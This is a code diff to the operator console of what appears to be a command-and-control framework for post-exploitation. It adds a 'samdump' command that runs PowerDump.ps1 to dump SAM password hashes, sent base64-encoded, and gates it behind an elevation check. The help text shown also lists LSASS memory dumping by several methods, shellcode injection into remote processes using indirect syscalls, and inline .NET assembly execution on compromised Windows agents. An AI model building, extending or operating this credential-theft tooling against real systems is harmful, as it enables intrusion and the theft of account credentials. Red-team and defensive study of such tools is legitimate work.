@@ -111,7 +111,7 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
         'comsvcs': None,
         'eviltwin': None
     },
-    'sam': None,
+    'samdump': None,
     'shellc': None,
     'assembly': None,
     'msgbox': None,
@@ -151,9 +151,11 @@ agent_completer_linux = NestedCompleter.from_nested_dict({
 
 elevated_commands = [
     "lsass",
-    "sam",
     "persist-spe",
     "critical"
+]
+elevated_commands_ps_modules = [
+    "samdump"
 ]
 
 
@@ -230,7 +232,7 @@ def print_agent_help(os):
     lsass direct                           ->  Dump Lsass directly (elevation required)
     lsass comsvcs                          ->  Dump Lsass using Rundll32 and Comsvcs.dll (elevation required)
     lsass eviltwin                         ->  Dump Lsass using the Evil Lsass Twin method (elevation required)
-    sam                                    ->  Dump sam,security,system hives using reg.exe (elevation required)
+    samdump                                ->  Dump SAM hashes using inline PowerDump.ps1 (elevation required)
     shellc <raw-shellcode-file> <pid>      ->  Inject shellcode to a remote process using indirect syscalls
     assembly <local-assembly> <args>       ->  Execute inline .NET assembly (pass all args as a single quoted string)
     
@@ -365,7 +367,8 @@ def agent_screen_windows(agent_id):
                 }
 
             # handle ps_modules
-            elif re.fullmatch(r"\s*(pstree|software|modules|modules_full)\s*", command):
+            elif re.fullmatch(
+                r"\s*(pstree|software|modules|modules_full|samdump)\s*", command):
                 ps_module = command.replace(" ", "")
                 powershell_command = getattr(ps_modules, ps_module)
                 encoded_powershell_command = utils.encode_base_64(powershell_command)
@@ -441,11 +444,6 @@ def agent_screen_windows(agent_id):
                 command_dict = {
                     "command_type": "lsass",
                     "dump_method": dump_method
-                }
-
-            elif re.fullmatch(r"\s*sam\s*", command):
-                command_dict = {
-                    "command_type": "sam"
                 }
 
             elif re.fullmatch(r"\s*shellc .+", command):
@@ -585,7 +583,10 @@ def agent_screen_windows(agent_id):
                 parse_common_command(command)
                 continue
 
-            if command_dict["command_type"] in elevated_commands and listener.agents[agent_id]["info"]["Elevated"].strip() == 'False':
+            if \
+                (command_dict["command_type"] in elevated_commands or \
+                    (command_dict["command_type"] == "iex" and "ps_module" in command_dict and command_dict["ps_module"] in elevated_commands_ps_modules)) and \
+                listener.agents[agent_id]["info"]["Elevated"].strip() == 'False':
                 utils.log_message(f"[-] This command requires elevation", print_time=False)
                 continue
             else:
